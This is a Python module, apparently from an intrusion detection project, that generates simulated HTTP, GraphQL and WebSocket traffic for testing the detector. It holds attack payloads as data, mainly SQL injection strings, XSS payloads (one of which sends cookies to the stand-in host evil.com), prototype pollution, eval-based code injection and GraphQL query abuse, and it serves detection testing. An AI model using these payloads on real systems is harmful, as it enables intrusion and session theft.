"""
Traffic Simulator
Generates simulated attack traffic for testing the IDS.
"""

from typing import List, Generator
import random

from ..core.packet import Packet, Protocol


class TrafficSimulator:
    """
    Generates simulated network traffic with various attack patterns.
    
    Used for testing and demonstrating the IDS capabilities.
    """
    
    # Sample source IPs
    ATTACKER_IPS = [
        "192.168.1.100",
        "10.0.0.50",
        "172.16.0.25",
        "203.0.113.42",
        "198.51.100.17",
    ]
    
    LEGIT_IPS = [
        "192.168.1.10",
        "10.0.0.5",
        "172.16.0.1",
    ]
    
    def __init__(self, seed: int = None):
        """
        Initialize the traffic simulator.
        
        Args:
            seed: Random seed for reproducible tests
        """
        if seed is not None:
            random.seed(seed)
    
    def generate_all_attack_scenarios(self) -> List[Packet]:
        """
        Generate a comprehensive set of attack scenarios.
        
        Returns:
            List of packets covering all attack types
        """
        packets = []
        
        # HTTP attacks
        packets.extend(self._generate_http_attacks())
        
        # GraphQL attacks
        packets.extend(self._generate_graphql_attacks())
        
        # WebSocket attacks
        packets.extend(self._generate_websocket_attacks())
        
        # Some legitimate traffic for comparison
        packets.extend(self._generate_legitimate_traffic())
        
        return packets
    
    def _generate_http_attacks(self) -> List[Packet]:
        """Generate HTTP attack packets."""
        attacks = []
        
        # 1. SQLi in query parameter
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[0],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="GET",
            path="/api/users",
            headers={"Host": "target.com", "User-Agent": "Mozilla/5.0"},
            query_params={"id": "1 OR 1=1--", "name": "admin"},
        ))
        
        # 2. SQLi UNION attack
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[0],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="GET",
            path="/api/products",
            headers={"Host": "target.com"},
            query_params={"category": "1 UNION SELECT username,password FROM users--"},
        ))
        
        # 3. XSS in query parameter
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[1],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="GET",
            path="/search",
            headers={"Host": "target.com"},
            query_params={"q": "<script>alert('XSS')</script>"},
        ))
        
        # 4. XSS in header
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[1],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="GET",
            path="/",
            headers={
                "Host": "target.com",
                "User-Agent": "<img src=x onerror=alert('XSS')>",
                "Referer": "javascript:alert(document.cookie)",
            },
        ))
        
        # 5. Abnormal HTTP method - TRACE
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[2],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="TRACE",
            path="/",
            headers={"Host": "target.com"},
        ))
        
        # 6. Abnormal HTTP method - DEBUG
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[2],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="DEBUG",
            path="/api/debug",
            headers={"Host": "target.com"},
        ))
        
        # 7. Header overflow attack
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[3],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="GET",
            path="/",
            headers={
                "Host": "target.com",
                "X-Custom-Header": "A" * 10000,  # Oversized header
            },
        ))
        
        # 8. SQLi in POST body
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[0],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="POST",
            path="/api/login",
            headers={
                "Host": "target.com",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            body="username=admin'--&password=anything",
        ))
        
        # 9. Time-based SQLi
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[4],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="GET",
            path="/api/user",
            headers={"Host": "target.com"},
            query_params={"id": "1; SELECT SLEEP(5)--"},
        ))
        
        return attacks
    
    def _generate_graphql_attacks(self) -> List[Packet]:
        """Generate GraphQL attack packets."""
        attacks = []
        
        # 1. Deep query attack (depth > 10)
        deep_query = """
        query {
            user {
                posts {
                    comments {
                        author {
                            posts {
                                comments {
                                    author {
                                        posts {
                                            comments {
                                                author {
                                                    posts {
                                                        comments {
                                                            id
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        """
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[0],
            destination_port=4000,
            protocol=Protocol.GRAPHQL,
            method="POST",
            path="/graphql",
            headers={
                "Host": "api.target.com",
                "Content-Type": "application/json",
            },
            body=f'{{"query": "{deep_query.replace(chr(10), " ").replace(chr(34), chr(92)+chr(34))}"}}',
        ))
        
        # 2. Complexity attack (many fields)
        complex_query = """
        query {
            users { id name email phone address { street city country postalCode } }
            products { id name price description category { name parent { name } } }
            orders { id total items { product { name } quantity } customer { name } }
            analytics { pageViews uniqueVisitors bounceRate avgSessionDuration }
            reports { daily { sales revenue } weekly { sales revenue } monthly { sales } }
        }
        """
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[1],
            destination_port=4000,
            protocol=Protocol.GRAPHQL,
            method="POST",
            path="/graphql",
            headers={
                "Host": "api.target.com",
                "Content-Type": "application/json",
            },
            body=f'{{"query": "{complex_query.replace(chr(10), " ").replace(chr(34), chr(92)+chr(34))}"}}',
        ))
        
        # 3. Alias abuse attack
        alias_query = "query { " + " ".join([f"u{i}: user(id: {i}) {{ id name }}" for i in range(60)]) + " }"
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[2],
            destination_port=4000,
            protocol=Protocol.GRAPHQL,
            method="POST",
            path="/graphql",
            headers={
                "Host": "api.target.com",
                "Content-Type": "application/json",
            },
            body=f'{{"query": "{alias_query}"}}',
        ))
        
        # 4. Introspection attack
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[3],
            destination_port=4000,
            protocol=Protocol.GRAPHQL,
            method="POST",
            path="/graphql",
            headers={
                "Host": "api.target.com",
                "Content-Type": "application/json",
            },
            body='{"query": "{ __schema { types { name fields { name } } } }"}',
        ))
        
        # 5. SQLi in GraphQL variable
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[4],
            destination_port=4000,
            protocol=Protocol.GRAPHQL,
            method="POST",
            path="/graphql",
            headers={
                "Host": "api.target.com",
                "Content-Type": "application/json",
            },
            body='{"query": "query getUser($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1 OR 1=1--"}}',
        ))
        
        return attacks
    
    def _generate_websocket_attacks(self) -> List[Packet]:
        """Generate WebSocket attack packets."""
        attacks = []
        
        # 1. XSS in WebSocket message
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[0],
            destination_port=8080,
            protocol=Protocol.WEBSOCKET,
            headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            },
            body='{"type": "message", "content": "<script>document.location=\\"http://evil.com/?c=\\"+document.cookie</script>"}',
        ))
        
        # 2. SQLi in WebSocket
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[1],
            destination_port=8080,
            protocol=Protocol.WEBSOCKET,
            headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
            },
            body='{"action": "query", "sql": "SELECT * FROM users WHERE id = 1 OR 1=1"}',
        ))
        
        # 3. Prototype pollution
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[2],
            destination_port=8080,
            protocol=Protocol.WEBSOCKET,
            headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
            },
            body='{"__proto__": {"isAdmin": true}, "username": "attacker"}',
        ))
        
        # 4. Code injection attempt
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[3],
            destination_port=8080,
            protocol=Protocol.WEBSOCKET,
            headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
            },
            body='{"callback": "eval(atob(\\"YWxlcnQoMSk=\\"))"}',
        ))
        
        # 5. Malformed JSON
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[4],
            destination_port=8080,
            protocol=Protocol.WEBSOCKET,
            headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
            },
            body='{"message": "test", "data": undefined, broken json here',
        ))
        
        # 6. Event handler XSS
        attacks.append(Packet(
            source_ip=self.ATTACKER_IPS[0],
            destination_port=8080,
            protocol=Protocol.WEBSOCKET,
            headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
            },
            body='{"html": "<img src=x onerror=alert(1)>", "render": true}',
        ))
        
        return attacks
    
    def _generate_legitimate_traffic(self) -> List[Packet]:
        """Generate legitimate traffic for comparison."""
        legit = []
        
        # Normal HTTP GET
        legit.append(Packet(
            source_ip=self.LEGIT_IPS[0],
            destination_port=80,
            protocol=Protocol.HTTP,
            method="GET",
            path="/api/products",
            headers={"Host": "target.com", "User-Agent": "Mozilla/5.0"},
            query_params={"page": "1", "limit": "20"},
        ))
        
        # Normal HTTP POST
        legit.append(Packet(
            source_ip=self.LEGIT_IPS[1],
            destination_port=443,
            protocol=Protocol.HTTPS,
            method="POST",
            path="/api/contact",
            headers={
                "Host": "target.com",
                "Content-Type": "application/json",
            },
            body='{"name": "John Doe", "email": "john@example.com", "message": "Hello!"}',
        ))
        
        # Normal GraphQL query
        legit.append(Packet(
            source_ip=self.LEGIT_IPS[2],
            destination_port=4000,
            protocol=Protocol.GRAPHQL,
            method="POST",
            path="/graphql",
            headers={
                "Host": "api.target.com",
                "Content-Type": "application/json",
            },
            body='{"query": "{ user(id: 1) { name email } }"}',
        ))
        
        # Normal WebSocket message
        legit.append(Packet(
            source_ip=self.LEGIT_IPS[0],
            destination_port=8080,
            protocol=Protocol.WEBSOCKET,
            headers={
                "Upgrade": "websocket",
                "Connection": "Upgrade",
            },
            body='{"type": "ping", "timestamp": 1642680000}',
        ))
        
        return legit
    
    def generate_stream(self, count: int = 100) -> Generator[Packet, None, None]:
        """
        Generate a stream of random traffic.
        
        Args:
            count: Number of packets to generate
            
        Yields:
            Random packets (mix of attacks and legitimate)
        """
        all_scenarios = self.generate_all_attack_scenarios()
        
        for _ in range(count):
            yield random.choice(all_scenarios)
